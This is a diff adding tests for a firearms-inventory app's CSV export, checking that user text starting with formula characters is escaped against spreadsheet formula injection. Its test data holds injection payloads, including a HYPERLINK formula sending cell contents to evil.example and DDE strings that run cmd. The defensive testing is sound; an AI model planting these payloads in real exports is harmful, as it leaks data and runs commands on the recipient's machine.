@@ -727,6 +727,43 @@ describe("GET /api/exports/full-armory", () => {
     expect(csv).toContain("totalSupplies");
   });
 
+  // A cell that starts with = + - @, a tab or a carriage return opens as a
+  // formula in a spreadsheet. Any signed-in user can type one into a name or
+  // a note, and whoever opens the export would run it.
+  it.each([
+    ["=", '=HYPERLINK("http://evil.example/?"&A1,"open")'],
+    ["+", "+1+cmd|' /C calc'!A0"],
+    ["-", "-2+3+cmd|' /C calc'!A0"],
+    ["@", "@SUM(1+1)*cmd|' /C calc'!A0"],
+    ["a tab", "\t=1+1"],
+    ["a carriage return", "\r=1+1"],
+  ])("CSV: user text starting with %s is written with a leading ' so it opens as text", async (_name, text) => {
+    mocks.findFirearms.mockResolvedValue([
+      { id: "firearm-1", name: text, manufacturer: "Acme", model: "M4", caliber: "5.56", serialNumber: "ABC123456", type: "RIFLE", acquisitionDate: null, purchasePrice: 1200, currentValue: 1450, notes: text, imageUrl: null },
+    ]);
+    const response = await GET(new NextRequest("http://localhost/api/exports/full-armory?format=csv"));
+    const cells = parseCsv(await response.text()).flat();
+    // The name (and wherever else the export repeats the text) is guarded...
+    expect(cells.filter((cell) => cell === `'${text}`).length).toBeGreaterThanOrEqual(1);
+    expect(cells).not.toContain(text);
+    // ...and no cell anywhere in the file starts with a trigger character, a negative number aside.
+    expect(cells.filter((cell) => /^[=+\-@\t\r]/.test(cell) && !/^-\d+(\.\d+)?$/.test(cell))).toEqual([]);
+  });
+
+  it("CSV: a negative number stays a number, and a value holding a bare carriage return is quoted", async () => {
+    mocks.findFirearms.mockResolvedValue([
+      { id: "firearm-1", name: "Duty Carbine", manufacturer: "Acme", model: "M4", caliber: "5.56", serialNumber: "ABC123456", type: "RIFLE", acquisitionDate: null, purchasePrice: -5, currentValue: -12.5, notes: "line one\rline two", imageUrl: null },
+    ]);
+    const response = await GET(new NextRequest("http://localhost/api/exports/full-armory?format=csv"));
+    const csv = await response.text();
+    const cells = parseCsv(csv).flat();
+    expect(cells).toContain("-5");
+    expect(cells).toContain("-12.5");
+    expect(cells).not.toContain("'-5");
+    expect(cells).not.toContain("'-12.5");
+    expect(csv).toContain('"line one\rline two"');
+  });
+
   it("returns PDF bytes for download format", async () => {
     const request = new NextRequest("http://localhost/api/exports/full-armory?format=pdf&includeDocuments=false");
     const response = await GET(request);
